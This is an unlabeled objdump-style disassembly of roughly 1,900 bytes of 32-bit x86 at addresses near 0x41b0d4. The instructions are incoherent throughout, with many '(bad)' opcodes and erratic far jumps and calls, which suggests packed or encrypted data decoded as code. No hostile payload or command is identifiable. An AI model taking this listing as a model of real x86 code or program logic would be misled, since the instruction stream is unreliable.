  41b0d4:	inc    ebp
  41b0d5:	jp     0x41b14f
  41b0d7:	aas    
  41b0d8:	adc    bl,bl
  41b0da:	shl    edx,cl
  41b0dc:	stos   BYTE PTR es:[edi],al
  41b0dd:	out    0x7f,eax
  41b0df:	outs   dx,BYTE PTR ds:[esi]
  41b0e0:	lods   al,BYTE PTR ds:[esi]
  41b0e1:	inc    ebx
  41b0e2:	dec    edi
  41b0e3:	jnp    0x41b0eb
  41b0e5:	dec    ebx
  41b0e6:	xchg   BYTE PTR ds:0xd0c39d80,dl
  41b0ec:	dec    ebp
  41b0ed:	sbb    ch,BYTE PTR [esi-0x64]
  41b0f0:	clc    
  41b0f1:	sub    DWORD PTR [ebx],edx
  41b0f3:	adc    BYTE PTR [eax],al
  41b0f5:	sahf   
  41b0f6:	stc    
  41b0f7:	leave  
  41b0f8:	xor    esp,DWORD PTR [edi+edx*2-0x17ece821]
  41b0ff:	dec    ebx
  41b100:	jmp    0x41b16b
  41b102:	xchg   ecx,eax
  41b103:	sbb    ecx,DWORD PTR [edi]
  41b105:	xchg   ebp,eax
  41b106:	call   0x3d5b:0x4aff964e
  41b10d:	nop
  41b10e:	retf   0x3f25
  41b111:	xchg   esp,eax
  41b112:	pop    ss
  41b113:	and    al,0xca
  41b115:	fld    TBYTE PTR [ebx]
  41b117:	daa    
  41b118:	sbb    eax,0x72e7de25
  41b11d:	pushf  
  41b11e:	stos   DWORD PTR es:[edi],eax
  41b11f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b120:	imul   edx,DWORD PTR [edx-0x6aa62a54],0xffffffb9
  41b127:	adc    bl,BYTE PTR ds:0x46b8d26e
  41b12d:	add    ah,ah
  41b12f:	jb     0x41b0bd
  41b131:	mov    ebx,DWORD PTR [eax]
  41b133:	and    DWORD PTR [edx+edi*1-0x270d1be3],eax
  41b13a:	(bad)
  41b13d:	retf   0x1f62
  41b140:	adc    DWORD PTR [edi+0x22],0x9a6c9c04
  41b147:	cs xchg edi,eax
  41b149:	and    eax,DWORD PTR [ecx-0x14]
  41b14c:	pop    es
  41b14d:	jo     0x41b140
  41b14f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b150:	jne    0x41b14b
  41b152:	jecxz  0x41b18e
  41b154:	mov    ebp,0xd07078aa
  41b159:	jg     0x41b0fd
  41b15b:	mov    al,0xf4
  41b15d:	pop    ebx
  41b15e:	push   esp
  41b15f:	xchg   ecx,eax
  41b160:	xchg   edi,eax
  41b161:	jnp    0x41b1de
  41b163:	ins    BYTE PTR es:[edi],dx
  41b164:	mov    BYTE PTR ds:0x7d7b69f6,dh
  41b16a:	cld    
  41b16b:	add    esi,edx
  41b16d:	jl     0x41b1e0
  41b16f:	scas   al,BYTE PTR es:[edi]
  41b170:	mov    ecx,0x8151566f
  41b175:	sub    eax,0x4229c6
  41b17a:	xchg   edx,eax
  41b17b:	sub    BYTE PTR [edx+0x0],al
  41b17e:	push   eax
  41b17f:	xor    DWORD PTR ds:0x4228e6,0x42296a
  41b189:	push   edx
  41b18a:	jmp    0x41b5d3
  41b18f:	xor    DWORD PTR [esi],ecx
  41b191:	inc    esi
  41b192:	or     ebx,DWORD PTR [eax]
  41b194:	xor    ah,BYTE PTR [ecx]
  41b196:	and    al,0xeb
  41b198:	fwait
  41b199:	ds push 0x74e63e08
  41b19f:	jge    0x41b1b6
  41b1a1:	or     al,0x16
  41b1a3:	(bad)  
  41b1a4:	push   cs
  41b1a5:	push   ss
  41b1a6:	push   ss
  41b1a7:	or     esi,DWORD PTR [ebx+0x7a12e405]
  41b1ad:	out    0xbe,al
  41b1af:	xor    eax,0x75e8288
  41b1b4:	fdivr  DWORD PTR [ebp-0x36c65220]
  41b1ba:	jne    0x41b1a6
  41b1bc:	(bad)  
  41b1bd:	cmp    BYTE PTR ds:0x261b40d4,bh
  41b1c3:	fist   DWORD PTR [edi+edx*1]
  41b1c6:	sub    bh,BYTE PTR [ecx]
  41b1c8:	inc    ebp
  41b1c9:	imul   ebp,esi,0xa9418c69
  41b1cf:	inc    esi
  41b1d0:	and    DWORD PTR [ebp-0x7b71614c],eax
  41b1d6:	or     DWORD PTR [ebp-0x40080c0],ebx
  41b1dc:	jle    0x41b17a
  41b1de:	pop    ss
  41b1df:	in     al,0xd1
  41b1e1:	jg     0x41b248
  41b1e3:	mov    ebx,gs
  41b1e5:	cli    
  41b1e6:	(bad)  
  41b1e8:	icebp  
  41b1e9:	loopne 0x41b199
  41b1eb:	sub    al,0x7c
  41b1ed:	sbb    esi,DWORD PTR [eax]
  41b1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1f0:	jnp    0x41b1a2
  41b1f2:	stos   DWORD PTR es:[edi],eax
  41b1f3:	imul   esi,DWORD PTR [ecx-0x48],0x69501964
  41b1fa:	pop    edx
  41b1fb:	dec    eax
  41b1fc:	mov    eax,ds:0x1cb4c855
  41b201:	mov    BYTE PTR [edi+0x43eab3fe],dl
  41b207:	pop    ebx
  41b208:	mov    bh,0x9d
  41b20a:	adc    edx,DWORD PTR [edx+0x4f]
  41b20d:	adc    al,0x70
  41b20f:	aas    
  41b210:	fidivr DWORD PTR [edx+edi*4-0x7b]
  41b214:	(bad)  
  41b215:	dec    esi
  41b216:	out    dx,eax
  41b217:	(bad)  
  41b218:	retf   
  41b219:	loope  0x41b296
  41b21b:	jge    0x41b1e2
  41b21d:	push   ds
  41b21e:	or     al,0x29
  41b220:	cmp    al,0xc4
  41b222:	jmp    0x74866591
  41b227:	jne    0x41b248
  41b229:	add    BYTE PTR [edx+0x7c],cl
  41b22c:	fmul   QWORD PTR [esi-0x651d1274]
  41b232:	add    al,0x62
  41b234:	scas   al,BYTE PTR es:[edi]
  41b235:	or     cl,BYTE PTR [ecx+0x17]
  41b238:	test   eax,0x7285f03d
  41b23d:	jl     0x41b2bc
  41b23f:	mov    bl,0xf7
  41b241:	je     0x41b22a
  41b243:	dec    edi
  41b244:	call   0x4d1a:0xc89c6c99
  41b24b:	sbb    BYTE PTR [esi-0x2da54e64],ch
  41b251:	pop    ebx
  41b252:	int3   
  41b253:	or     DWORD PTR [ebx],edi
  41b255:	imul   ebp,DWORD PTR [esi],0x77
  41b258:	pop    es
  41b259:	push   ds
  41b25a:	(bad)  
  41b25b:	cmp    eax,0xfc8469a2
  41b260:	add    al,0x58
  41b262:	pop    es
  41b263:	cmc    
  41b264:	cmp    DWORD PTR [ebx],0x2cea7cb0
  41b26a:	and    eax,0xb57138d7
  41b26f:	ins    BYTE PTR es:[edi],dx
  41b270:	addr16 (bad) 
  41b272:	popf   
  41b273:	xor    BYTE PTR [ecx],al
  41b275:	jbe    0x41b247
  41b277:	imul   eax,ecx,0xf79d77ab
  41b27d:	and    al,0x7d
  41b27f:	mov    ch,0x62
  41b281:	ins    DWORD PTR es:[edi],dx
  41b282:	aaa    
  41b283:	and    ah,BYTE PTR [edx+0x226137a4]
  41b289:	aam    0x1e
  41b28b:	loope  0x41b281
  41b28d:	in     al,dx
  41b28e:	push   0x40
  41b290:	ss cmp esp,esp
  41b293:	add    DWORD PTR [ebp+0x73],ecx
  41b296:	pop    edx
  41b297:	pop    esp
  41b298:	xor    al,0x37
  41b29a:	test   BYTE PTR [esi+0x3f7e3973],ch
  41b2a0:	push   cs
  41b2a1:	mov    esp,DWORD PTR [edx]
  41b2a3:	jp     0x41b320
  41b2a5:	(bad)  
  41b2a6:	aas    
  41b2a7:	retf   0xb8ad
  41b2aa:	ret    
  41b2ab:	aad    0x4c
  41b2ad:	sub    DWORD PTR [ebp+0x2d4ca2dd],0x89b3fcf3
  41b2b7:	mov    dh,0xc7
  41b2b9:	add    ebx,ecx
  41b2bb:	sar    DWORD PTR [eax+0x182d4d44],1
  41b2c1:	or     DWORD PTR [eax-0x32],eax
  41b2c4:	stc    
  41b2c5:	cmp    BYTE PTR [eax-0x4937d61f],0x31
  41b2cc:	ja     0x41b2f2
  41b2ce:	jns    0x41b300
  41b2d0:	adc    BYTE PTR [esi+0x61],bl
  41b2d3:	push   ebx
  41b2d4:	pop    edi
  41b2d5:	test   BYTE PTR [edx],ch
  41b2d7:	mov    fs,WORD PTR [ebx+0x7cfafb]
  41b2dd:	in     al,dx
  41b2de:	cmp    eax,DWORD PTR [eax+0x1c674361]
  41b2e4:	(bad)  
  41b2e6:	icebp  
  41b2e7:	ss xchg edi,eax
  41b2e9:	jb     0x41b271
  41b2eb:	sbb    al,0x76
  41b2ed:	or     DWORD PTR [esi+eiz*4],0x663e0393
  41b2f4:	scas   al,BYTE PTR es:[edi]
  41b2f5:	aas    
  41b2f6:	mov    ch,0xac
  41b2f8:	pop    ss
  41b2f9:	and    esi,DWORD PTR [esp+ecx*2+0x7a]
  41b2fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2fe:	adc    BYTE PTR [ebx+edi*2],bh
  41b301:	rcl    BYTE PTR [edi+0x7fde23e1],1
  41b307:	in     eax,dx
  41b308:	test   BYTE PTR [ebx+0x65],bh
  41b30b:	fld    DWORD PTR [eax+esi*8]
  41b30e:	sar    BYTE PTR [ebp-0x48adbed0],0xf9
  41b315:	sahf   
  41b316:	mov    ch,BYTE PTR [edx+0x38]
  41b319:	pextrw edx,(bad),0xc5
  41b31b:	push   edi
  41b31c:	mov    WORD PTR [edi+0x62],cs
  41b31f:	frstor [esi-0x27971562]
  41b325:	mov    dl,0x6d
  41b327:	(bad)  
  41b328:	lods   eax,DWORD PTR ds:[esi]
  41b329:	in     eax,0x9f
  41b32b:	ins    DWORD PTR es:[edi],dx
  41b32c:	xchg   DWORD PTR [edx+ebp*4+0x4d],edx
  41b330:	xchg   bh,dl
  41b332:	sbb    DWORD PTR [eax],ecx
  41b334:	sub    eax,0x1ab2bba1
  41b339:	add    eax,0x56b72075
  41b33e:	sti    
  41b33f:	bswap  edx
  41b341:	int    0xf7
  41b343:	lock jne 0x41b2d4
  41b346:	sbb    dl,ah
  41b348:	aas    
  41b349:	and    cl,BYTE PTR [ecx-0x5e2d441f]
  41b34f:	dec    esp
  41b350:	mov    al,0xb9
  41b352:	push   eax
  41b353:	inc    edi
  41b354:	int    0x22
  41b356:	dec    ebp
  41b357:	inc    BYTE PTR [ecx]
  41b359:	cmp    eax,0x590ae155
  41b35e:	loope  0x41b2f6
  41b360:	xor    DWORD PTR ds:[eax-0x73],eax
  41b364:	stc    
  41b365:	sahf   
  41b366:	adc    eax,0xd1db0c83
  41b36b:	loopne 0x41b3e5
  41b36d:	imul   edi,ebx,0x16d5dd1f
  41b373:	aam    0x62
  41b375:	repz hlt 
  41b377:	rol    DWORD PTR [eax-0x59],cl
  41b37a:	dec    eax
  41b37b:	and    ebx,eax
  41b37d:	outs   dx,BYTE PTR ds:[esi]
  41b37e:	js     0x41b382
  41b380:	inc    edi
  41b381:	call   0x5f188263
  41b386:	ss fwait
  41b388:	add    al,0x7a
  41b38a:	dec    edx
  41b38b:	add    al,0x36
  41b38d:	(bad)  [esi]
  41b38f:	enter  0x6f50,0x36
  41b393:	jnp    0x41b343
  41b395:	pop    esp
  41b396:	sahf   
  41b397:	add    DWORD PTR [ecx+0x41f9525b],edx
  41b39d:	std    
  41b39e:	or     ebp,DWORD PTR ds:0xaa61be3e
  41b3a4:	fstp   st(4)
  41b3a6:	mov    bh,0x12
  41b3a8:	jl     0x41b371
  41b3aa:	xor    DWORD PTR [ecx-0x27],esi
  41b3ad:	stc    
  41b3ae:	sub    eax,0xb022a5b9
  41b3b3:	xchg   ebp,eax
  41b3b4:	dec    edi
  41b3b5:	es push edx
  41b3b7:	stc    
  41b3b8:	xor    cl,BYTE PTR [edi+edi*4]
  41b3bb:	les    ecx,FWORD PTR [eax-0xd24d9de]
  41b3c1:	and    BYTE PTR [edx],0x96
  41b3c4:	add    ebp,DWORD PTR [edi+ebx*4+0x38]
  41b3c8:	test   eax,0x4687cbd8
  41b3cd:	and    eax,0x98c71b34
  41b3d2:	jne    0x41b3c3
  41b3d4:	xor    al,0x49
  41b3d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3d7:	xor    BYTE PTR [ecx],bh
  41b3d9:	jae    0x41b3e3
  41b3db:	in     eax,0xf9
  41b3dd:	inc    ebx
  41b3de:	je     0x41b443
  41b3e0:	sahf   
  41b3e1:	call   0x6894cdbb
  41b3e6:	sub    BYTE PTR [edi-0x71],dl
  41b3e9:	mov    eax,0x911e0482
  41b3ee:	mov    bh,0x83
  41b3f0:	jmp    0x8df2:0x2f71b35c
  41b3f7:	nop
  41b3f8:	add    BYTE PTR [eax],bh
  41b3fa:	ficomp WORD PTR [ebx]
  41b3fc:	data16 es jae 0x41b3a1
  41b400:	mov    bh,0x22
  41b402:	mov    eax,0x2b9cba64
  41b407:	loop   0x41b3db
  41b409:	or     BYTE PTR [eax],al
  41b40b:	xor    dl,bl
  41b40d:	and    al,0xe9
  41b40f:	mov    BYTE PTR [eax],bh
  41b411:	pop    es
  41b412:	ror    esi,0x8a
  41b415:	je     0x41b402
  41b417:	cli    
  41b418:	jl     0x41b448
  41b41a:	mov    ds:0x49d915e8,al
  41b41f:	xor    dl,BYTE PTR [esi+0x4b]
  41b422:	ror    BYTE PTR [edi-0x349231ef],cl
  41b428:	mov    bh,0x26
  41b42a:	mul    DWORD PTR [ecx]
  41b42c:	cmp    al,0xe8
  41b42e:	cmp    bh,BYTE PTR [edi]
  41b430:	std    
  41b431:	test   eax,0xb5efd971
  41b437:	lods   eax,DWORD PTR ds:[esi]
  41b438:	out    dx,eax
  41b439:	stos   BYTE PTR es:[edi],al
  41b43a:	xchg   ebp,eax
  41b43b:	add    eax,0xc6d42f3f
  41b440:	imul   ebx,DWORD PTR [esi+0x56ef03f3],0x265bc8eb
  41b44a:	arpl   WORD PTR [edx],ax
  41b44c:	mov    es,WORD PTR [ecx]
  41b44e:	(bad)  [eax]
  41b450:	pop    esp
  41b451:	mov    al,ds:0xdcf4b79
  41b456:	mul    BYTE PTR [edi]
  41b458:	imul   esi,esi,0xd095e59f
  41b45e:	mov    dh,al
  41b460:	push   0x969055de
  41b465:	mov    esp,0x7ab8d334
  41b46a:	mov    dl,0xdd
  41b46c:	push   0xffffffa6
  41b46e:	push   0xffffffe2
  41b470:	cmp    DWORD PTR [esi+ecx*4],ebx
  41b473:	xchg   ecx,eax
  41b474:	mov    ecx,DWORD PTR [eax+ebx*1]
  41b477:	shl    BYTE PTR [ebx*1+0x3b308aa7],0x7d
  41b47f:	lds    ecx,FWORD PTR [esi+0x79]
  41b482:	or     DWORD PTR [edi-0x3e],esi
  41b485:	icebp  
  41b486:	repz lea ebp,[ecx]
  41b489:	ds ja  0x41b4ec
  41b48c:	adc    DWORD PTR [eax+0x2a],ebp
  41b48f:	shr    BYTE PTR [edi],1
  41b491:	cmc    
  41b492:	dec    eax
  41b493:	rcr    DWORD PTR [eax+0x66],cl
  41b496:	sub    eax,0x32
  41b499:	and    al,0x4a
  41b49b:	push   ecx
  41b49c:	inc    edi
  41b49d:	les    ebx,FWORD PTR [edx]
  41b49f:	lahf   
  41b4a0:	je     0x41b48e
  41b4a2:	mov    eax,0x627706de
  41b4a7:	arpl   WORD PTR ds:0x9cb09a52,bx
  41b4ad:	ja     0x41b46d
  41b4af:	sub    BYTE PTR fs:[ecx+edx*1+0x3a],bh
  41b4b4:	mov    WORD PTR [edx],gs
  41b4b6:	and    eax,0x78f32ab4
  41b4bb:	xchg   ecx,eax
  41b4bc:	addr16 jo 0x41b459
  41b4bf:	(bad)  
  41b4c0:	(bad)  
  41b4c1:	(bad)  
  41b4c2:	xor    BYTE PTR [edi-0x78],bh
  41b4c5:	das    
  41b4c6:	sub    DWORD PTR [esi-0x77],edx
  41b4c9:	cmc    
  41b4ca:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4cc:	mov    al,ds:0xf0ac7f1e
  41b4d1:	pop    edi
  41b4d2:	jle    0x41b468
  41b4d4:	hlt    
  41b4d5:	push   cs
  41b4d6:	xchg   DWORD PTR [edx+ecx*1],esp
  41b4d9:	cmp    al,0x8e
  41b4db:	sbb    esi,esi
  41b4dd:	sub    DWORD PTR [eax-0x2],edi
  41b4e0:	call   0x3073327c
  41b4e5:	jecxz  0x41b4a4
  41b4e7:	or     al,0xfe
  41b4e9:	in     al,dx
  41b4ea:	dec    edi
  41b4eb:	rcl    BYTE PTR [eax+0x28],0xc0
  41b4ef:	push   edx
  41b4f0:	pop    esi
  41b4f1:	jnp    0x41b4b1
  41b4f3:	adc    BYTE PTR [eax],dl
  41b4f5:	retf   0xb63a
  41b4f8:	mov    ebx,0x1084ed00
  41b4fe:	sub    ch,BYTE PTR [esi+0x32]
  41b501:	pop    es
  41b502:	jg     0x41b53d
  41b504:	mov    ebx,0x336d753f
  41b509:	js     0xfc195bfa
  41b50f:	repz mov ss,esi
  41b512:	xchg   ebp,eax
  41b513:	in     eax,0x60
  41b515:	popa   
  41b516:	scas   eax,DWORD PTR es:[edi]
  41b517:	add    edi,edx
  41b519:	sbb    BYTE PTR [esi+0x1761be1e],ch
  41b51f:	jle    0x41b532
  41b521:	cmp    bl,BYTE PTR [ecx+0x4a89d9fc]
  41b527:	dec    ebx
  41b528:	ret    0xab6
  41b52b:	das    
  41b52c:	test   DWORD PTR [eax-0x28],0xdf404fba
  41b533:	dec    esp
  41b534:	sbb    cl,BYTE PTR [esi+0x50c31979]
  41b53a:	pop    ebx
  41b53c:	scas   eax,DWORD PTR es:[edi]
  41b53d:	sub    cl,BYTE PTR [edx-0xa]
  41b540:	mov    ecx,0xc296438f
  41b545:	ret    
  41b546:	test   BYTE PTR [ebp-0x1b],bl
  41b549:	jmp    0xed9fbb97
  41b54e:	pop    esp
  41b54f:	jmp    0x5266:0xb31fa60c
  41b556:	fadd   st,st(2)
  41b558:	cs mov eax,0x440f1f8d
  41b55e:	lods   eax,DWORD PTR ds:[esi]
  41b55f:	xor    eax,0xeadf20b6
  41b564:	sahf   
  41b565:	retf   
  41b566:	addr16 xchg edi,eax
  41b568:	cld    
  41b569:	(bad)  
  41b56b:	mov    BYTE PTR [ebp-0x1954df13],cl
  41b571:	stos   DWORD PTR es:[edi],eax
  41b572:	(bad)  
  41b574:	or     BYTE PTR [esi+0x2c],0x2e
  41b578:	xchg   DWORD PTR [eax-0x59],edi
  41b57b:	adc    eax,0x23825507
  41b580:	sbb    al,0xf
  41b582:	or     edi,ebp
  41b584:	les    esi,FWORD PTR [esi-0x2e]
  41b587:	daa    
  41b588:	enter  0x39a9,0x8c
  41b58c:	jne    0x41b54d
  41b58e:	mov    bl,0x3
  41b590:	mov    bl,0xcf
  41b592:	lods   al,BYTE PTR ds:[esi]
  41b593:	sbb    DWORD PTR [eax+0x36],ebx
  41b596:	loope  0x41b546
  41b598:	aas    
  41b599:	in     eax,dx
  41b59a:	(bad)
  41b59d:	sbb    eax,0x38cc3465
  41b5a2:	retf   
  41b5a3:	sub    eax,0xa85803f3
  41b5a8:	xor    bh,BYTE PTR [esi+0x7c574de8]
  41b5ae:	and    BYTE PTR [edi-0x6d],dh
  41b5b1:	in     eax,0x30
  41b5b3:	xor    eax,0x337f17ec
  41b5b8:	xchg   ebx,eax
  41b5b9:	dec    esp
  41b5ba:	neg    cl
  41b5bc:	sbb    DWORD PTR [ebp+esi*1-0x38],eax
  41b5c0:	add    ecx,DWORD PTR [edi+0x6aeecfa6]
  41b5c6:	data16 fdivr DWORD PTR [ecx]
  41b5c9:	jp     0x41b621
  41b5cb:	(bad)  
  41b5cc:	pusha  
  41b5cd:	jae    0x41b55e
  41b5cf:	push   DWORD PTR [edi-0x47171380]
  41b5d5:	sub    DWORD PTR [eax],eax
  41b5d7:	add    cl,ch
  41b5d9:	inc    esp
  41b5da:	add    al,0x0
  41b5dc:	add    BYTE PTR [esi],cl
  41b5de:	adc    BYTE PTR [esi+edi*8+0x58],0xd3
  41b5e3:	fs xor ch,0xf0
  41b5e7:	and    al,0x68
  41b5e9:	outs   dx,DWORD PTR ds:[esi]
  41b5ea:	inc    esi
  41b5eb:	fisubr WORD PTR [eax+0x160c0d2d]
  41b5f1:	(bad)  
  41b5f2:	push   cs
  41b5f3:	push   ss
  41b5f4:	push   ss
  41b5f5:	js     0x41b590
  41b5f7:	in     al,0x15
  41b5f9:	lods   eax,DWORD PTR ds:[esi]
  41b5fa:	ret    
  41b5fb:	jns    0x41b647
  41b5fd:	ror    ah,1
  41b5ff:	in     al,dx
  41b600:	xchg   ecx,eax
  41b601:	cmc    
  41b602:	sub    dl,al
  41b604:	jle    0x41b61d
  41b606:	retf   0x4554
  41b609:	cdq    
  41b60a:	pop    ss
  41b60b:	lahf   
  41b60c:	shl    BYTE PTR [edx-0x33a30f47],cl
  41b612:	xor    al,0x67
  41b614:	xor    DWORD PTR [ebx],ebp
  41b616:	or     ecx,esp
  41b618:	sub    BYTE PTR ds:0x12e9fb04,bh
  41b61e:	mov    cl,0x6b
  41b620:	cli    
  41b621:	and    eax,0xd03f8c47
  41b626:	jl     0x41b5ec
  41b628:	add    esp,ebp
  41b62a:	push   esi
  41b62b:	push   0x733b89ca
  41b630:	fisub  WORD PTR [ebx-0x22e50b05]
  41b636:	cmp    eax,0xac02bbed
  41b63b:	hlt    
  41b63c:	mov    edx,0x969ecd14
  41b641:	mov    ebx,0x710af5db
  41b646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b647:	neg    BYTE PTR [esi+0xcf441da]
  41b64d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b64e:	inc    ebx
  41b64f:	mov    eax,0x83896fcf
  41b654:	stos   DWORD PTR es:[edi],eax
  41b655:	add    BYTE PTR [ecx+0x15c0a199],al
  41b65b:	mov    ecx,0x4108bc1d
  41b660:	bound  esi,QWORD PTR [esi+0xa]
  41b663:	xor    eax,eax
  41b665:	retf   
  41b666:	xchg   ecx,eax
  41b667:	inc    ebp
  41b668:	xchg   esi,eax
  41b669:	mov    bl,0x6c
  41b66b:	fld    QWORD PTR [ebp-0x3f7f925e]
  41b671:	sub    al,0x22
  41b673:	das    
  41b674:	outs   dx,DWORD PTR ds:[esi]
  41b675:	or     eax,0x873e716f
  41b67a:	lods   al,BYTE PTR ds:[esi]
  41b67b:	pop    es
  41b67c:	ss mov edx,0xe6bead7b
  41b682:	sub    cl,BYTE PTR [ebp-0x52]
  41b685:	add    BYTE PTR [ebx],dh
  41b687:	out    dx,eax
  41b688:	dec    edi
  41b689:	jns    0x41b62d
  41b68b:	daa    
  41b68c:	test   DWORD PTR [esi],eax
  41b68e:	nop
  41b68f:	ss jmp 0xf88fb494
  41b695:	call   0xcbf4:0x409fab5f
  41b69c:	inc    esp
  41b69d:	in     eax,dx
  41b69e:	out    dx,eax
  41b69f:	mov    eax,0xb01b524d
  41b6a4:	jmp    0x30be2471
  41b6a9:	and    bl,BYTE PTR [ecx]
  41b6ab:	outs   dx,BYTE PTR ds:[esi]
  41b6ac:	mov    DWORD PTR [ebx+0x24b4c924],edi
  41b6b2:	addr16 xor bl,cl
  41b6b5:	inc    esp
  41b6b6:	and    ebp,0x17c6c396
  41b6bc:	popf   
  41b6bd:	outs   dx,DWORD PTR ds:[esi]
  41b6bf:	test   al,0xc0
  41b6c1:	mov    ebp,0x390ab968
  41b6c6:	cmp    al,0x67
  41b6c8:	jle    0x41b663
  41b6ca:	js     0x41b6b2
  41b6cc:	into   
  41b6cd:	sbb    esi,ebx
  41b6cf:	fisttp QWORD PTR [ecx+0x1a0cf135]
  41b6d5:	jecxz  0x41b6f5
  41b6d7:	shl    ah,cl
  41b6d9:	jne    0x41b6d4
  41b6db:	sbb    al,0x6c
  41b6dd:	jne    0x41b676
  41b6df:	stos   BYTE PTR es:[edi],al
  41b6e0:	scas   eax,DWORD PTR es:[edi]
  41b6e1:	dec    ebx
  41b6e2:	dec    edx
  41b6e3:	sahf   
  41b6e4:	arpl   WORD PTR [edx+edi*4-0x49e05a58],bx
  41b6eb:	dec    ebp
  41b6ec:	outs   dx,BYTE PTR ds:[esi]
  41b6ed:	push   eax
  41b6ee:	mov    ebp,0x41cf5a64
  41b6f3:	pop    edi
  41b6f4:	add    al,0xb
  41b6f6:	or     cl,BYTE PTR [ebx]
  41b6f8:	test   al,0x24
  41b6fa:	ficomp WORD PTR [ebx]
  41b6fc:	mov    dl,0xaa
  41b6fe:	mov    ds:0x8ad2ef40,al
  41b703:	dec    ecx
  41b704:	es pop esi
  41b706:	ja     0x41b6b6
  41b708:	les    eax,FWORD PTR [edx-0x2a]
  41b70b:	out    0xd5,eax
  41b70d:	inc    ecx
  41b70e:	dec    esi
  41b70f:	(bad)  
  41b710:	mov    bh,0xa1
  41b712:	add    BYTE PTR [eax],al
  41b714:	xor    DWORD PTR [edi-0x448b9d7f],edi
  41b71a:	inc    edx
  41b71b:	lock aaa 
  41b71d:	test   DWORD PTR [ebx-0x7e],0xc316b31d
  41b724:	push   cs
  41b725:	mov    ebp,0x16eee15
  41b72a:	adc    al,0x85
  41b72c:	or     esp,DWORD PTR [esi+0x5f]
  41b72f:	cmp    al,0x34
  41b731:	jecxz  0x41b78d
  41b733:	inc    eax
  41b734:	(bad)  
  41b735:	lods   eax,DWORD PTR ds:[esi]
  41b736:	mov    cl,bh
  41b738:	fnstenv [eax]
  41b73a:	(bad)  
  41b73b:	ja     0x41b746
  41b73d:	pop    esp
  41b73e:	(bad)  [eax-0x42bc433a]
  41b744:	(bad)  
  41b745:	cmc    
  41b746:	push   esp
  41b747:	adc    bh,BYTE PTR [edi+0x513bb00a]
  41b74d:	push   cs
  41b74e:	les    ecx,FWORD PTR ds:0x9e5b28d2
  41b754:	jbe    0x41b7c9
  41b756:	push   ebx
  41b757:	inc    edi
  41b758:	xchg   BYTE PTR [esi-0x55bc1687],dh
  41b75e:	dec    esi
  41b760:	scas   eax,DWORD PTR es:[edi]
  41b761:	popa   
  41b762:	jge    0x41b6e4
  41b764:	scas   eax,DWORD PTR es:[edi]
  41b765:	ins    BYTE PTR es:[edi],dx
  41b766:	pop    ebx
  41b767:	lahf   
  41b768:	mov    dh,0x70
  41b76a:	cmp    eax,DWORD PTR [ecx-0x58a099b3]
  41b770:	in     eax,dx
  41b771:	into   
  41b772:	cmp    eax,0x5223e1bb
  41b777:	push   ss
  41b778:	add    ecx,DWORD PTR [edi]
  41b77a:	fwait
  41b77b:	push   ecx
  41b77c:	sbb    al,0x15
  41b77e:	aam    0x90
  41b780:	dec    ebx
  41b781:	bound  ebx,QWORD PTR [esi-0x3ade1504]
  41b787:	and    BYTE PTR [edx+0xe86b366],ah
  41b78d:	ror    esi,0xe4
  41b790:	arpl   WORD PTR [ebp-0x1649307f],sp
  41b796:	loopne 0x41b7b0
  41b798:	daa    
  41b799:	mov    sp,0xe9b8
  41b79d:	dec    ebp
  41b79e:	fiadd  WORD PTR [edi+0x7a9a60d4]
  41b7a4:	lock xchg edx,eax
  41b7a6:	out    dx,eax
  41b7a7:	mov    al,ds:0xff5eb0f
  41b7ac:	jb     0x41b795
  41b7ae:	callw  0x4dd0
  41b7b2:	test   BYTE PTR [edi+0x8b026de],bh
  41b7b8:	sbb    BYTE PTR [esi+0x2c0b43f0],ch
  41b7be:	aas    
  41b7bf:	push   ebp
  41b7c0:	jae    0x41b7df
  41b7c2:	mov    ebx,0xd9f50515
  41b7c7:	rcr    BYTE PTR [edx],1
  41b7c9:	loopne 0x41b7d8
  41b7cb:	push   edi
  41b7cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7cd:	cli    
  41b7ce:	push   cs
  41b7cf:	popf   
  41b7d0:	je     0x41b84c
  41b7d2:	push   ds
  41b7d3:	sti    
  41b7d4:	scas   eax,DWORD PTR es:[edi]
  41b7d5:	fist   DWORD PTR [ecx]
  41b7d7:	dec    esp
  41b7d8:	lods   al,BYTE PTR ds:[esi]
  41b7d9:	add    dl,BYTE PTR [ebp+0x1dc24cfd]
  41b7df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7e0:	adc    BYTE PTR [esi],dh
  41b7e2:	fmul   QWORD PTR [ebp-0x36fdcbf1]
  41b7e8:	sub    cl,BYTE PTR [ebp-0x75]
  41b7eb:	xchg   DWORD PTR [edi],ebx
  41b7ed:	mov    ah,0xdd
  41b7ef:	popf   
  41b7f0:	add    edi,DWORD PTR [edi+edi*1+0x38]
  41b7f4:	cdq    
  41b7f5:	dec    ecx
  41b7f6:	jne    0x41b79b
  41b7f8:	mov    WORD PTR [edx],cs
  41b7fa:	pop    ebx
  41b7fb:	or     ecx,DWORD PTR [ecx]
  41b7fd:	arpl   WORD PTR [ebx],cx
  41b7ff:	call   0x1f7df190
  41b804:	sbb    BYTE PTR [eax],ch
  41b806:	fsub   QWORD PTR [edi+edi*4+0x738ee656]
  41b80d:	adc    BYTE PTR [ecx+0x4],dl
  41b810:	ret    
  41b811:	dec    ecx
  41b812:	push   ebp
  41b813:	mov    ds:0x4f62a4c6,eax
  41b818:	pop    esi
  41b819:	jecxz  0x41b82e
  41b81b:	dec    edi
  41b81c:	cmp    cl,bl
  41b81e:	ds adc al,0x4d
  41b821:	inc    edi
  41b822:	push   0x397bbf36
  41b827:	(bad)  
  41b828:	fld    DWORD PTR [edx+edi*1]
  41b82b:	pop    es
  41b82c:	lahf   
  41b82d:	push   esp
  41b82e:	xchg   edx,eax
  41b82f:	iret   
  41b830:	inc    edi
  41b831:	or     eax,0x5821c156
  41b836:	mov    ebp,0xd3853b99
  41b83b:	adc    al,0xe5
  41b83d:	jnp    0x41b881
  41b83f:	cs sbb eax,0x855a8784
  41b845:	pop    ebx
  41b846:	or     edi,edi
  41b848:	into   
  41b849:	rol    bh,0x21
  41b84c:	test   al,0xc3
